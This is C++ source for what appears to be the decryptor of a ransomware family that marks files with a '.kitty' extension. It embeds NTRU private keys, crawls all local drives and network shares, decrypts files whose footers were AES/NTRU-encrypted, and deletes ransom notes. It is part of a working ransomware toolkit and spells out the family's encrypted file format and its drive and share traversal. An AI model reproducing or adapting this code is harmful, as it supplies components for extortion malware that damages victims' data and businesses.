#include <windows.h>
#include <shlwapi.h>
#include <stdio.h>
#include <string>

#include "..\Innocent\config.h"

#include "..\crc32\crc32.h"
#include "..\enc-struct.h"


#ifdef _DEBUG
#include "..\new-private-ntru-key-debug.h"
#include "..\new-public-ntru-key-debug.h"
#else
//#include "..\new-private-ntru-key-debug.h"
//#include "..\new-public-ntru-key-debug.h"
#include "..\new-private-ntru-key-release.h"
#include "..\new-public-ntru-key-release.h"
#endif

#include "..\Innocent\ntru.hpp"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Wbemuuid.lib")
#pragma comment(lib, "Mpr.lib")
#pragma comment(lib, "Iphlpapi.lib")


typedef struct _file_to_decrypt
{
	//LPWSTR lpwPath;
	HANDLE hFile;
	WCHAR localPath[0x7FFF];
}file_to_decrypt;


static volatile LONG filesQueued = 0;
static volatile LONG filesProcessed = 0;




typedef struct _enc_end_of_file_ntru
{
	byte ntru_encrypted[sizeof(ntru_public_bytes)];
	uint16_t cipherLen;
	DWORD dwEncryptedFlag;
} enc_end_of_file_ntru;



#include "..\Innocent\aesMbedTls.hpp"

DWORD WINAPI decryptFile(file_to_decrypt *ftd) {


	bool decryptedSusccess = false;

	
	DWORD dwRead;
	DWORD dwWritten;
	LARGE_INTEGER fileMove;

	enc_end_of_file_ntru encFileEof;
	LARGE_INTEGER fileSize;
	GetFileSizeEx(ftd->hFile, &fileSize);

	fileMove.QuadPart = fileSize.QuadPart - sizeof(encFileEof);
	SetFilePointerEx(ftd->hFile, fileMove, nullptr, FILE_BEGIN);
	ReadFile(ftd->hFile, &encFileEof, sizeof(encFileEof), &dwRead, nullptr);

	if ( dwRead == sizeof(encFileEof) )
	{
		if (encFileEof.dwEncryptedFlag == ENCRYPTED_FILE_FLAG)
		{		
			uint16_t outLen = sizeof(enc_header);
			enc_header encHeader;
			NTRUEncrypt256 ntru256;
			ntru256.SetPrivateKey(ntru_private_bytes, sizeof(ntru_private_bytes));
			ntru256.SetPublicKey(ntru_public_bytes, sizeof(ntru_public_bytes));

			ntru256.Decrypt((uint8_t*)&encFileEof.ntru_encrypted, encFileEof.cipherLen, (uint8_t*)&encHeader, &outLen);

			if (encHeader.dwMagic == ENCRYPTION_MAGIC)
			{
				fileMove.QuadPart = fileSize.QuadPart - sizeof(encFileEof);
				SetFilePointerEx(ftd->hFile, fileMove, nullptr, FILE_BEGIN);
				SetEndOfFile(ftd->hFile);

				AES128MbedTls aes;
				aes.SetKeyIv(encHeader.aes_key, encHeader.aes_iv, MBEDTLS_AES_DECRYPT);
				
				fileMove.QuadPart = (LONG)0;
				SetFilePointerEx(ftd->hFile, fileMove, nullptr, FILE_BEGIN);

				DWORD crc32 = 0;
				LONGLONG currentBlockIndex = 0;
				LONGLONG totalBytesDecrypted = 0;

				byte* fileBuffer = (byte*)malloc(encHeader.blockSize);
				byte* outputbuffer = (byte*)malloc(encHeader.blockSize);

				DWORD lastBlockSize = 0;

				while (true)
				{
					ReadFile(ftd->hFile, fileBuffer, encHeader.blockSize, &dwRead, nullptr);
					if (dwRead == 0) 
						break;

					if (dwRead < encHeader.blockSize) {
						dwRead = ALIGNUP(dwRead, AES_BLOCKLEN);
					}

					if (!aes.Decrypt(fileBuffer, outputbuffer, dwRead)) {
						dbg(LEVEL1, "Failed to decrypt aes buffer of %S", ftd->localPath);
					}

					lastBlockSize = dwRead;

					SetFilePointerEx(ftd->hFile, fileMove, nullptr, FILE_BEGIN);
					WriteFile(ftd->hFile, outputbuffer, dwRead, &dwWritten, nullptr);

					if ((encHeader.encType & ENCTYPE_FULL_FILE) == ENCTYPE_FULL_FILE) {
						currentBlockIndex = currentBlockIndex + 1;
					}
					else if ((encHeader.encType & ENCTYPE_RANDOM_BLOCKS) == ENCTYPE_RANDOM_BLOCKS) {
						currentBlockIndex = currentBlockIndex + 1 + Random::Get(encHeader.StepRandSeed, encHeader.StepRandMax);
					}

					if ((encHeader.encType & ENCTYPE_LIMIT_FILE_SIZE) == ENCTYPE_LIMIT_FILE_SIZE) {
						totalBytesDecrypted += dwRead;
						if (totalBytesDecrypted >= encHeader.qwMaxEnctyptionSize) {
							break;
						}
					}

					fileMove.QuadPart = (currentBlockIndex * encHeader.blockSize);
					SetFilePointerEx(ftd->hFile, fileMove, nullptr, FILE_BEGIN);
				}

				if ((encHeader.encType & ENCTYPE_USE_CRC32) == ENCTYPE_USE_CRC32) {
					crc32 = xcrc32(outputbuffer, lastBlockSize, 0);
				}

				fileMove.QuadPart = encHeader.qwOriginalFileSize;
				SetFilePointerEx(ftd->hFile, fileMove, nullptr, FILE_BEGIN);
				SetEndOfFile(ftd->hFile);

				if ((encHeader.encType & ENCTYPE_USE_CRC32) == ENCTYPE_USE_CRC32)
				{
					if (crc32 == encHeader.endBlockCrc32) {
						decryptedSusccess = true;
					}
					else {
						dbg(LEVEL1, "ERROR: CRC32 FAILED %S", ftd->localPath);
					}
				}
				else {
					decryptedSusccess = true;
				}

				free(outputbuffer);
				free(fileBuffer);

			}
			else {
				dbg(LEVEL1, "File %S is unable to decrypt info header", ftd->localPath);
			}
		}
	}
	CloseHandle(ftd->hFile);

	const LPCWSTR lpwExt = L".kitty";

	if (decryptedSusccess) 
	{
		if (LPWSTR lpwCrypted = StrRStrIW(ftd->localPath, NULL, lpwExt))
		{
			// check is it eof
			if (lstrlenW(lpwCrypted) == lstrlenW(lpwExt))
			{
				WCHAR newpath[0x7FFF];
				lstrcpyW(newpath, ftd->localPath);
				*(StrRStrIW(newpath, NULL, lpwExt)) = 0;
				if (!MoveFile(ftd->localPath, newpath)) {
					dbg(LEVEL1, "Failed to move file %S -> %S, error = %d", ftd->localPath, newpath, GetLastError());
				}
			}
		}
	}

	delete ftd;

	InterlockedExchangeAdd(&filesProcessed, 1);

	return 0;
}

void searchForFiles(PCWSTR widePath) {
	if (widePath) {
		if (auto localPath = (WCHAR*)malloc(32767 * sizeof(WCHAR))) 
		{
			wnsprintfW(localPath, 32767, L"%s\\*", widePath);

			WIN32_FIND_DATAW wFD;
			HANDLE findHandle = FindFirstFileW(localPath, &wFD);

			if (findHandle != INVALID_HANDLE_VALUE) 
			{
				do {
					wnsprintfW(localPath, 32767, L"%s\\%s", widePath, wFD.cFileName);

					if (wFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
					{
						if (lstrcmpW(wFD.cFileName, L"..") == 0 || lstrcmpW(wFD.cFileName, L".") == 0)
							continue;

						searchForFiles(localPath);

					} else {

						if (StrCmpIW(CharLowerW(wFD.cFileName), LOCKED_NOTE) == 0) {
							DeleteFileW(localPath);
							continue;
						}

						if ((wFD.dwFileAttributes & FILE_ATTRIBUTE_READONLY) == FILE_ATTRIBUTE_READONLY) {
							SetFileAttributesW(localPath, wFD.dwFileAttributes & ~FILE_ATTRIBUTE_READONLY);
						}

						HANDLE fileHandle = CreateFileW(localPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
						if(fileHandle != INVALID_HANDLE_VALUE) 
						{
							InterlockedExchangeAdd(&filesQueued, 1);

							file_to_decrypt* ftd = new file_to_decrypt();
							ftd->hFile = fileHandle;
							lstrcpyW(ftd->localPath, localPath);

							if (!QueueUserWorkItem((LPTHREAD_START_ROUTINE)decryptFile, ftd, WT_EXECUTEDEFAULT)) {
								dbg(LEVEL1, "ERROR: QueueUserWorkItem(%S), error=%d", localPath, GetLastError());
							}
						}
						else {
							dbg(LEVEL1, "ERROR: open file fail %S, error=%d", localPath, GetLastError());
						}
					}
				} while (FindNextFileW(findHandle, &wFD));
				FindClose(findHandle);
			}
			wnsprintfW(localPath, 32767, L"%s\\" LOCKED_NOTE, widePath);

			free(localPath);
		}
	}
}

void searchForNetworkFolders(LPNETRESOURCEW pNetResource)
{
	HANDLE hEnum;
	DWORD dwEntries = -1, cbBuffer = 0x4000;
	if (WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, RESOURCEUSAGE_ALL, pNetResource, &hEnum) == NO_ERROR)
	{
		if (pNetResource = (LPNETRESOURCEW)malloc(cbBuffer))
		{
			while (WNetEnumResourceW(hEnum, &dwEntries, pNetResource, &cbBuffer) == NO_ERROR)
			{
				for (DWORD i = 0; i < dwEntries; ++i)
				{
					if ((pNetResource[i].dwUsage & RESOURCEUSAGE_CONTAINER) == RESOURCEUSAGE_CONTAINER) searchForNetworkFolders(&pNetResource[i]);
					else searchForFiles(pNetResource[i].lpRemoteName);
				}
			}
			free(pNetResource);
		}
		WNetCloseEnum(hEnum);
	}
}



LONG WINAPI TOP_LEVEL_EXCEPTION_FILTER(_In_ struct _EXCEPTION_POINTERS *ExceptionInfo)
{
	// MessageBoxA(GetForegroundWindow(), "Exception in decryption", nullptr, MB_OK | MB_ICONERROR);
	return EXCEPTION_CONTINUE_EXECUTION;
}

HANDLE hMutex = nullptr;

bool CreateAndContinue(const wchar_t* _mutexName)
{
	if (hMutex)
		return true;

	hMutex = OpenMutexW(SYNCHRONIZE, FALSE, _mutexName);
	if (hMutex)
	{
		CloseHandle(hMutex);
		return false;
	}

	hMutex = CreateMutexW(nullptr, FALSE, _mutexName);
	if (hMutex == nullptr)
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
			return false;
	}

	return true;
}


void CloseMutex()
{
	CloseHandle(hMutex);
}

void StopDoubleProcessRun()
{
	if (!CreateAndContinue(L"EnigmaThread"))
	{
#ifdef _DEBUG
		dbg(LEVEL1, "nono bro double process");
		getchar();
#endif
		// MessageBoxW(GetForegroundWindow(), L"Decryption process is already run, please wait...", nullptr, MB_OK | MB_ICONWARNING);
		ExitProcess(0);
	}
}

#if defined(_DEBUG) || defined(_LOG_ENABLED_)
int main()
#else
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCmdLine,int       nShowCmd)
#endif
{
	INT counter = 0;
	WCHAR szDrives[32767];
	LPNETRESOURCEW lpRes = nullptr;
	HANDLE threadList[MAX_PATH];

	SetErrorMode(SEM_FAILCRITICALERRORS);
	SetUnhandledExceptionFilter(TOP_LEVEL_EXCEPTION_FILTER);

	StopDoubleProcessRun();

	// DeleteAutorun();

#ifdef _DEBUG1
	HANDLE hFile = CreateFileW(L"C:\\temp\\cmd.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		decryptFile(hFile);
	}
	ExitProcess(0);
#endif



	// initMasterKey();

	int numArgs = 0;
	LPWSTR* lpwParams = CommandLineToArgvW(GetCommandLineW(), &numArgs);
	if (!lpwParams)
		return 0;

	// exe.exe -path \\somepoath\c$
	if (numArgs >= 3) {
		if (lstrcmpiW(lpwParams[1], L"-path") == 0) 
		{
			// -path
			if (WCHAR* drivePath = (WCHAR*)malloc(32767 * sizeof(WCHAR)))
			{
				lstrcpyW(drivePath, lpwParams[2]);
				PathAddBackslashW(drivePath);

				dbg(LEVEL1, "Found drive %S", drivePath);

				threadList[counter++] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)searchForFiles, drivePath, 0, nullptr);
			}

		}
	}

	if (numArgs == 1)
	{
		threadList[counter++] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)searchForNetworkFolders, lpRes, 0, nullptr);
		if (GetLogicalDriveStringsW(32767, szDrives))
		{
			WCHAR* pDrive = szDrives;
			while (*pDrive)
			{
				if (WCHAR* drivePath = (WCHAR*)malloc(32767 * sizeof(WCHAR)))
				{
					wnsprintfW(drivePath, 32767, L"\\\\?\\%c:", pDrive[0]);

					dbg(LEVEL1, "Found drive %S", drivePath);

					threadList[counter++] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)searchForFiles, drivePath, 0, nullptr);
				}
				pDrive += lstrlenW(pDrive) + 1;
			}
		}
	}


	WaitForMultipleObjects(counter, threadList, TRUE, INFINITE);
	while (filesProcessed < filesQueued) Sleep(5000);

	dbg(LEVEL1, "Quit");

	LocalFree(lpwParams);

	return 0;
}
